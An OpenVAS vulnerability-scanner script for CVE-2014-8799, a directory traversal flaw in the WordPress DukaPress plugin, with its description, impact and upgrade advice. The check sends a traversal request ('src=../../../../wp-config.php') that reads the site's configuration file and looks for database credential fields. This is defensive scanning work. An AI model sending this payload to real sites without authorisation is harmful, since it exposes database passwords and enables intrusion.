###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_dukaPress_dir_trav_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Wordpress DukaPress 'src' Parameter Directory Traversal Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805122");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2014-8799");
  script_bugtraq_id(71294);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-01-09 15:07:11 +0530 (Fri, 09 Jan 2015)");
  script_name("Wordpress DukaPress 'src' Parameter Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  DukaPress and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"Flaw is due to the dp_img_resize function
  in the php/dp-functions.php script not properly sanitizing user input,
  specifically path traversal style attacks (e.g. '../') via the 'src'
  parameter that contains '..' to lib/dp_image.php.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to download arbitrary files.");

  script_tag(name:"affected", value:"Wordpress DukaPress plugin before 2.5.4");

  script_tag(name:"solution", value:"Upgrade to version 2.5.4 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/98943");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35346");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/dukapress");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/dukapress/lib/dp_image.php'
          + '?src=../../../../wp-config.php';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
  pattern:"DB_NAME", extra_check:make_list("DB_USER", "DB_PASSWORD")))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
